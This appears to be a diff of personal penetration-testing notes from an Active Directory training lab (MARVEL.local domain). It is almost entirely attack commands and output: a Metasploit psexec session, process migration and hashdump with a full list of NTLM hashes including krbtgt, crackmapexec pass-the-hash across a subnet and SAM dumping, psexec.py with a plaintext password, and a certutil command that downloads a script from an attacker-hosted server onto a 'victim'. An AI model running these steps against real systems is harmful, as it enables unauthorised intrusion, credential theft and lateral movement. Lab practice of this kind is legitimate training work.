@@ -4,6 +4,42 @@ Win server (old)
 
 msf6 exploit(windows/smb/psexec) > set smbdomain MARVEL.local
 
+apt install crackmapexec
+
+PASS THE HASH ALONG NETWORK
+
+sysinfo
+whoami
+hashdump
+error --
+ps
+migrate 976 (ctfmon.exe         x64   1        MARVEL\Administrator)
+hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:88eae2ab60724c5947ad1790cb9aa5ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cf8a75a19984487991c5753075babb4e:::
+tstark:1108:aad3b435b51404eeaad3b435b51404ee:472dd0d4b33dd140a638ed2bbeba17bf:::
+marta:1110:aad3b435b51404eeaad3b435b51404ee:1a4b1757588cab6298e29e91c06df58d:::
+SQLservice:1111:aad3b435b51404eeaad3b435b51404ee:7e449687caaf71367ad41ad9490f926d:::
+fcastle:1115:aad3b435b51404eeaad3b435b51404ee:1a4b1757588cab6298e29e91c06df58d:::
+HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:b419deaa2441750b0e1b17b0938382e4:::
+THEPUNISHER$:1112:aad3b435b51404eeaad3b435b51404ee:b7765fc7a084594619f4b6031f7f09ef:::
+MARTA$:1113:aad3b435b51404eeaad3b435b51404ee:7c0689fb4133297ce856b030147dbf28:::
+THEPUNISHER2$:1114:aad3b435b51404eeaad3b435b51404ee:9f76e41124d234a7d001a240b71814b5:::
+
+crackmapexec smb 192.168.0.0/24 -u fcastle -H 1a4b1757588cab6298e29e91c06df58d -p Pa$$word
+
+crackmapexec smb 192.168.56.101 -u fcastle -H 1a4b1757588cab6298e29e91c06df58d -p Pa$$word --sam  
+
+
+crack ::segundo hash
+
+psexec.py marvel/fcastle:Pa$$word@192.168.56.101 (certo)
+
+No password spray in DOMAINs. may lock account
+
+
 python -m SimpleHTTPServer 80
 transfer to victim:
 certutil -urlcache -f http://10.10.14.30/Sherlock.ps1 Sherlock.ps1
